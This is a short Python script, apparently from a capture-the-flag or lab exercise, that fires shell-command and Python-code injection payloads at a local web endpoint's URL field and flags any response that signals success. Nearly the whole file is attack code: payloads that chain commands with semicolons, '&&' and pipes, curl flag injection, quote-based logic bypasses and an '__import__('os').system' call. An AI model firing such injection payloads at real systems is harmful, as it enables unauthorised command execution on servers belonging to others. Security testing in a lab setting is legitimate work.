import requests
import re

base_url = "http://127.0.0.1:32998"
add_url = f"{base_url}/add_url"

print("Testing different approaches to understand check_url...")

# Maybe check_url runs something that returns '200' in output
test_cases = [
    # Return 200 from command  
    ("http://example.com; echo 200", "Echo 200"),
    ("http://example.com && echo 200", "AND echo 200"),
    ("http://example.com | echo 200", "Pipe echo 200"),
    
    # Maybe it's using curl - add flags that won't fail
    ("http://127.0.0.1 -s -o /dev/null -w '200'", "Curl status code"),
    
    # Try forcing 200 into response
    ("; echo 'URL status was checked and returned 200 status'", "Fake response"),
    ("| echo 'URL status was checked and returned 200 status'", "Fake pipe"),
    
    # Python injection if it uses eval/exec
    ("http://example.com' or '1'=='1", "String compare"),
    ("http://example.com' or True", "Bool injection"),
    
    # Maybe subprocess without shell
    ("; __import__('os').system('ls')", "Python import"),
]

for payload, desc in test_cases:
    resp = requests.post(add_url, data={"url": payload})
    content = resp.text
    print(f"\n[{desc}]")
    print(f"  Payload: {payload}")
    if "success" in content and "true" in content:
        print(f"  [!] SUCCESS! Full response:\n{content}")
    else:
        print(f"  Response: {content}")

